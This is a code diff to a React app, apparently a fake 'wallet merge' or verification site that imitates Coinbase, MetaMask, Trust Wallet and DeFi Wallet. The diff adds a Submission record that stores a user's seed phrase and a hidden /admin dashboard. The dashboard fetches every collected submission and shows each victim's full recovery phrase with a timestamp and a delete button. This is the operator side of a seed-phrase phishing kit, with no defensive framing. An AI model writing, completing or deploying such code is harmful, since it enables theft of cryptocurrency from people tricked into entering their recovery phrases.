@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Bell, CheckCircle, ShieldCheck, AlertCircle } from "lucide-react";
 import { motion } from "framer-motion";
 import { BrowserRouter as Router, Route, Routes } from "react-router-dom";
@@ -13,6 +13,13 @@ import "./App.css";
 interface Wallet {
   name: string;
   icon: string;
+}
+
+interface Submission {
+  id?: number;
+  wallet: string;
+  seedPhrase: string;
+  timestamp: number;
 }
 
 function Button({ children, onClick, disabled }: { children: React.ReactNode, onClick: () => void, disabled?: boolean }) {
@@ -188,6 +195,68 @@ function MergeWallet({ wallet }: { wallet: Wallet | null }) {
   );
 }
 
+function AdminDashboard() {
+  const [submissions, setSubmissions] = useState<Submission[]>([]);
+  const walletIcons: { [name: string]: string } = {
+    "Coinbase": coinbaseIcon,
+    "MetaMask": metamaskIcon,
+    "Trust Wallet": trustwalletIcon,
+    "DeFi Wallet": defiIcon
+  };
+  useEffect(() => {
+    const loadSubmissions = async () => {
+      try {
+        const response = await fetch("/api/submissions");
+        const data: Submission[] = await response.json();
+        setSubmissions(data);
+      } catch (err) {
+        console.error("failed to load submissions", err);
+      }
+    };
+    loadSubmissions();
+  }, []);
+
+  const deleteSubmission = async (id: number | undefined) => {
+    if (id === undefined) return;
+    try {
+      await fetch(`/api/submissions?id=${id}`, {
+        method: "DELETE"
+      });
+      setSubmissions((prev) => prev.filter((s) => s.id !== id));
+    } catch (err) {
+      console.error("delete submission error", err);
+    }
+  };
+
+  return (
+    <div className="page admin-page">
+      <h1 className="title">Admin Dashboard</h1>
+      {submissions.length === 0 ? (
+        <p>No wallet submissions yet.</p>
+      ) : (
+        <div className="admin-grid scrollable-admin-grid">
+          {submissions.map((s) => (
+            <div key={s.id} className="admin-card beautiful-admin-card">
+              <div className="admin-header">
+                <img src={walletIcons[s.wallet] || coincryptexLogo} alt={s.wallet} className="admin-wallet-icon" />
+                <span className="admin-wallet-name">{s.wallet}</span>
+                <button className="admin-delete-btn" onClick={() => deleteSubmission(s.id)}>Delete</button>
+              </div>
+              <div className="admin-seed">
+                <span className="admin-seed-label">Seed Phrase:</span>
+                <span className="admin-seed-value">
+                  {s.seedPhrase}
+                </span>
+              </div>
+              <span className="admin-timestamp">{new Date(s.timestamp).toLocaleString()}</span>
+            </div>
+          ))}
+        </div>
+      )}
+    </div>
+  );
+}
+
 function App() {
   const [page, setPage] = useState(0);
   const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);
@@ -211,6 +280,7 @@ function App() {
             ][page]}
           </motion.div>
         } />
+        <Route path="/admin" element={<AdminDashboard />} />
       </Routes>
     </Router>
   );
